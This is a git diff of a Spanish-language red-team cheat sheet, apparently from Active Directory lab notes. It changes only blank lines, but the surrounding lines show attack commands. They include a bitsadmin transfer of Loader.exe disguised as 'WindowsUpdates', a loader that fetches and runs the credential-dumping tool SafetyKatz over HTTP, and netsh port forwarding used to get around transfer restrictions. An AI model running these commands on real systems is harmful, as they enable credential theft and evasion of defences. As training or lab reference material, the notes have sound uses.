@@ -37,6 +37,7 @@ C:\AD\Tools>net use x: /d
 ### Transferir archivo Loader.exe mediante bitsadmin
 bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader2.exe
 ```
+
 ### Netsh para Port Forward
 
 El siguiente comando redirige todas las conexiones entrantes en el puerto 8080 a la dirección IP 192.168.100.76 en el puerto 80. 
@@ -50,6 +51,7 @@ Esto puede ser útil en caso existan restricciones para la transferencia de arch
 ```
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 ```
+
 #### Verificando Port Forward
 
 ```cmd
